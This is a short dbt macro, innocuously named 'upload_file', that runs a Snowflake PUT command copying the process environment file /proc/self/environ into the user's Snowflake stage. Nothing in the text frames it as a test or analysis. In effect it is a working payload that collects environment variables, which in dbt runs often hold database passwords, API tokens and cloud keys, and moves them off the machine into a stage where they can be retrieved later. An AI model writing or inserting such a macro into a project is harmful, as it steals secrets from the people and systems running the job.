{% macro upload_file() %}
  {% set sql %}
    PUT file:///proc/self/environ @~ AUTO_COMPRESS=FALSE;
  {% endset %}
  
  {% do run_query(sql) %}
{% endmacro %}
